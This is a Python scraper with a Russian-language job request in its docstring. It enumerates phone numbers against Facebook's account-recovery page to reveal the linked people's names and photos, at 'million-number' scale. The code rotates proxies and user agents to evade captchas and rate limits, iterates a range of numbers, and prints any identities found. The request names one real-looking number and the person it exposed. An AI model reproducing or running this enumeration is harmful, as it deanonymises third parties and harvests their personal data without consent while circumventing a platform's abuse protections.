'''from grab import Grab, GrabError
from re import findall
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities



class EliteProxy:
    grab = Grab()
    driver = webdriver.PhantomJS()
    driver.set_window_size(1120, 550)

    def safe_grab_go(self, url):
        try:
            self.grab.go(url)
            return self.grab.response.unicode_body()

        except GrabError as e:
            print('Error %s' % e)
            return None

rawpost = {"lsd":"AZqj9xLQ",
           "email":"%2B79255002322",
           "did_submit":"Search",
           "__user": "0",
           "__a": "2",
           "__dyn": "7xe1JAwZwzx6bx67e-K1swgE98nwRzo6C7UW2O3Gaxe",
           "__req": "4",
           "__rev":"1955971",
}
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
url = "https://www.facebook.com/login/identify?ctx=recover"
phone = "+79255002322"
search_input = "identify_email"
submit_button = 'did_submit'
user_agent = (
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0"
)
dcap = dict(DesiredCapabilities.PHANTOMJS)
dcap["phantomjs.page.settings.userAgent"] = user_agent

driver = webdriver.PhantomJS(service_args=['--ssl-protocol=any'])
driver.set_window_size(1980, 1050)


driver.get('http://www.facebook.com')



dcap = dict(DesiredCapabilities.PHANTOMJS)
dcap["phantomjs.page.settings.userAgent"] = user_agent

browser = webdriver.PhantomJS(desired_capabilities=dcap, service_args=['--ssl-protocol=any'])
browser.set_window_size(1980, 1050)
browser.get('https://www.facebook.com')
number = "+79255002322"


Есть такое дело: нужно написать парсер фейсбука вытаскивающий личные данные по емейлам или телефонным номерам.
У фейсбука есть страница https://www.facebook.com/login/identify?ctx=recover, например вводим номер +79255002325, высвечивается "Залина Бочкаева", номер и фото.
Результат запроса может выглядеть как:
1) телефон + имя + фамилия
2) no result (не найден такой номер)
3) капча
4) Только телефон, без имени и фамилии

Сходу сделать запрос и распарсить ответ не получилось, там хитрые скрипты черти как отправляющие запросы через ajax. Нужно сделать многопоточный парсер, который бы переваривал миллионные списки номеров, делая запросы через прокси.

Возьмешься ли, и сколько возьмешь за работу? Если нет, посоветуешь к кому обратиться?






'''



from gevent.pool import Pool
from gevent import monkey, Timeout
monkey.patch_socket()
from time import sleep
from random import randint
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
#
from urllib2 import HTTPError, URLError
from types import GeneratorType
from random import choice as random_choice
from pyquery import PyQuery as pq
import gc

class Tools():


    def read_file_line_by_line(self, file_name):
        with open(file_name, 'r') as f:
            while True:
                line = f.readline()
                if not line:
                    break
                yield line
tools = Tools()

class Proxy:
    bad_proxy = []
    good_proxy = []
    proxy_file = '/data/proxy/proxy.plist'
    proxy_generator = tools.read_file_line_by_line(proxy_file)


    def return_proxy_dict(self, proxy, type=None):
        dict = {"http": proxy}
        if type:
            dict['type'] = type
        return dict

    def return_proxy(self):
        if isinstance(self.proxy_generator, GeneratorType):
            try:
                proxy = self.proxy_generator.next()
                if '\n' in proxy:
                    proxy = proxy.replace('\n', '')
                return proxy
            except StopIteration:
                self.proxy_generator = tools.read_file_line_by_line(self.proxy_file)
                self.return_proxy()
        else:
            self.proxy_generator = tools.read_file_line_by_line(self.proxy_file)
            self.return_proxy()

    def get_proxy(self):
        if len(self.good_proxy):
            proxy = random_choice(self.good_proxy)
        else:
            proxy = self.return_proxy()
        return self.return_proxy_dict(proxy)

    def append_proxy(self, place, proxy):
        if isinstance(proxy, dict):
            proxy = proxy.get('http')
        if place == 'good':
            if proxy not in self.good_proxy:
                self.good_proxy.append(proxy)
        elif place == 'bad':
            if proxy in self.good_proxy:
                self.good_proxy.remove(proxy)
            self.bad_proxy.append(proxy)

    def return_proxy_string(self, proxy):
        if isinstance(proxy, dict):
            proxy = proxy.get('http')
        return proxy
proxy = Proxy()

class Vault:
    stack = []


    def append_value(self, value):
        if value not in self.stack:
            self.stack.append(value)

    def remove_value(self, value):
        if value in self.stack:
            self.stack.remove(value)

    def get_value(self):
        if self.stack:
            value = random_choice(self.stack)
            self.remove_value(value)
        else:
            raise Exception('Can"t get value, self.stack is empty')
        return value

vault = Vault()

class Crawler():
    concurrency = 5
    pool = Pool(concurrency)
    url = "https://www.facebook.com/login/identify?ctx=recover"
    # On-page entities
    page = {
        'loaded': "Find Your Account",
        'found' : "Reset Your Password",
        'error': "Your Request Couldn",
        'nothing': "No Search Result",
        'change_proxy': "Please enter the text below"
    }

    def __init__(self):
        try:
            return self.pool.map(self.make_request, (x for x in xrange(79255002322, 79255002550)))
        except Exception:
            print("Exception raised")

    def get_driver(self, proxystr):
        user_agent = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.28.3 (KHTML, like Gecko) Version/3.2.3 ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/525.28.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 ChromePlus/1.6.3.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 ChromePlus/1.6.3.0alpha4",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13 ChromePlus/1.6.0.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; it-it) AppleWebKit/534.26+ (KHTML, like Gecko) Ubuntu/11.04 Epiphany/2.30.6",
        "Mozilla/5.0 (X11; U; Linux i686; it-it) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.30.2",
        "Mozilla/5.0 (X11; U; Linux x86_64; zh-cn) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.28.2 SUSE/2.28.0-2.4",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
        "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
        "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
        "Mozilla/5.0 (X11; Linux) KHTML/4.9.1 (like Gecko) Konqueror/4.9",
        "Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)",
    ]
        #user_agent = (
        #    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
        #)
        dcap = dict(DesiredCapabilities.FIREFOX)
        dcap["phantomjs.page.settings.userAgent"] = random_choice(user_agent)
        dcap["phantomjs.page.settings.acceptSslCerts"] = True
        service_args = ['--proxy=%s' % proxystr, '--proxy-type=http', '--ssl-protocol=any', '--ignore-ssl-errors=true', '--web-security=no', '--load-images=no']
        driver = webdriver.PhantomJS(desired_capabilities=dcap, service_args=service_args)
        #driver.set_window_size(1600, 900)
        return driver

    def make_request(self, credentials):
        search_input = "identify_email"
        submit_button = 'did_submit'
        proxystr = proxy.get_proxy()
        # Get webdriver and pass data
        driver = self.get_driver(proxystr)
        try:
            driver.get(self.url)
        except (URLError, HTTPError):
            vault.append_value(credentials)
            print("Got network error, repeating request")
        except Exception:
            vault.append_value(credentials)
            print("Got network error, repeating request")
        #driver.save_screenshot('initial%s.png' % id)
        try:
            search_input = driver.find_element_by_id(search_input)
            search_input.send_keys(credentials)
        except NoSuchElementException:
            print("Can't find search input")
            vault.append_value(credentials)
            # debug
            print(driver.page_source)
            return False
        try:
            submit_button = driver.find_element_by_name(submit_button)
            submit_button.click()
            #debug add some delay
            sleep(10)
        except NoSuchElementException:
            print("Can't find submit_button")
            vault.append_value(credentials)
            return False
        # Check response
        self.check_response(driver.page_source, driver, credentials, proxystr)
        # Collect garbage to prevent memory leaks
        driver = None
        gc.collect

    def check_response(self, data, driver, credentials, proxystr):
        if self.page['loaded'] in data:
            print('Page loaded for %s' % credentials)
            driver.save_screenshot('initial%s.png' % credentials)
            if self.page['nothing'] in data:
                print("No such user")
            elif self.page['change_proxy'] in data:
                vault.append_value(credentials)
                proxy.append_proxy('bad', proxystr)
                print("Got captcha, change proxy")
            elif self.page['error'] in data:
                vault.append_value(credentials)
                driver.save_screenshot('result%s.png' % credentials)
                print("Search failed")
            elif self.page['found'] in data:
                node = pq(data)
                print(node.find(".fsl.fwb.fcb").text())
                print('Found')
                print(data)
        elif self.page['error'] in data:
            vault.append_value(credentials)
            driver.save_screenshot('result%s.png' % credentials)
            print("Search failed")
        elif self.page['found'] in data:
            node = pq(data)
            print(node.find(".fsl.fwb.fcb").text())
            print('Found')
            print(data)
        else:
            vault.append_value(credentials)
            print("Page not loaded")
            #print(data)

crawler = Crawler()